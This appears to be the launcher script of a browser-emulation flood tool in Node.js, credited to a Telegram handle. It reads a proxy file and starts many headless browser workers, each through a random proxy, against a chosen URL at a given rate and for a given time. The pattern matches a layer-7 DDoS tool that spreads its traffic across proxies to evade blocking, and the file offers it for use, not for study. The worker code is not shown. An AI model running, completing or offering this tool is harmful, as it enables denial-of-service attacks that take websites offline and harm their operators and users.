const runAndRestart = require('./inc-emulation/chromium-worker.js');
const fs = require('fs');
const colors = require('colors')

let proxyIndex = 0;


process.on("uncaughtException", function (error) {
  console.error("Uncaught Exception:", error);
});

process.on("unhandledRejection", function (error) {
  console.error("Unhandled Rejection:", error);
});

const EventEmitter = require('events');
const emitter = new EventEmitter();
process.setMaxListeners(0);

const [_, __, browsers, proxyfile, rate, timeT, url] = process.argv;

if (process.argv.length < 5) {
  console.log((''));
  console.log((''));
  console.log(colors.magenta('[', colors.green('Browser Puppeteer Version'), ']'));
  console.log(colors.gray('Method by https://t.me/saitoha'));
  console.log((''));
  console.log(colors.red(' Info:'));
  console.log(colors.cyan('proxy:', colors.green('http/https type proxy')));
  console.log((''));
  console.log(colors.red(' Usage:') + ' node index.js <browsers> <proxyfile> <rate> <time> <url>');
  console.log((''));
  process.exit();
}

fs.readFile(proxyfile, 'utf-8', async (err, data) => {
  if (err) {
    console.error('Error read proxy:', err);
    return;
  }
  
  const proxies = data.trim().split("\n");
  
  const browserCount = parseInt(browsers, 10);
  console.log(`Starting browser ${url} emulation with ${browserCount} browsers...`);

  let currentBrowser = 0;
  const interval = setInterval(() => {
    if (currentBrowser < browserCount) {
      const selectedProxy = getProxy(proxies); // Select a new proxy for each browser instance
      runAndRestart(selectedProxy, rate, timeT, url).catch((error) => {});
      currentBrowser++;
    } else {
      clearInterval(interval);
    }
  }, 500);
  
  setTimeout(function() {
    console.clear();
    process.exit(-1);
  }, timeT * 1000);
});

function getProxy(proxies) {
  const randomIndex = Math.floor(Math.random() * proxies.length);
  return proxies[randomIndex];
}
